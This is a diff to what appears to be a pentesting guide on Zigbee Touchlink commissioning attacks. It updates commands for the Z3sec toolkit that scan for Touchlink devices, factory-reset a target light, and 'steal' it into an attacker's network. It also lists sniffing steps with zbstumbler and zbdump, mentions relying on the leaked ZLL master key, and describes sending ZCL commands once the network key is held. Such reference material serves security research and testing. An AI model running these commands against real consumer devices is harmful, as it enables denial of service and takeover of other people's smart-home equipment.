@@ -62,10 +62,13 @@ See also the [Touchlink commissioning research](https://www.wim.uni-mannheim.de/
 for the derivation and the separate authentication weaknesses in Touchlink commands.
 
 ```bash
-# z3sec — Zigbee 3 commissioning attack toolkit
+# Z3sec — Touchlink commissioning attack toolkit (needs a KillerBee-compatible radio
+# or SDR, and the leaked ZLL master key in ~/.config/z3sec/touchlink_crypt.ini).
 git clone https://github.com/IoTsec/Z3sec
-python z3sec_inter_pan.py --command "factory_reset_request" --device <addr>
-python z3sec_inter_pan.py --command "join_network" --network <PANID>
+
+# Scan for touchlink-enabled devices, then reset a target to factory-new.
+z3sec_touchlink --sdr -c all scan
+z3sec_touchlink --sdr -c 11 reset --target <extended-address>
 ```
 
 Outcomes:
@@ -144,11 +147,11 @@ zbstumbler -i 0
 zbdump -c <ch> -w cap.pcap
 # Open in Wireshark with dot15d4/zigbee dissectors
 
-# 3. Touchlink attack on consumer Zigbee 3.0 lighting
-python z3sec_inter_pan.py --command "factory_reset_request" --target <addr>
+# 3. Touchlink attack on consumer Zigbee 3.0 lighting (factory-reset / DoS)
+z3sec_touchlink --sdr -c <ch> reset --target <extended-address>
 
-# 4. Steal device into attacker network
-python z3sec_inter_pan.py --command "join_network" --target <addr>
+# 4. Steal device into attacker network (touchlink network update / join)
+z3sec_touchlink --sdr -c <ch> update --target <extended-address>
 
 # 5. With network key, issue ZCL commands directly
 # (custom scapy-dot15d4 + zbee_nwk frames)
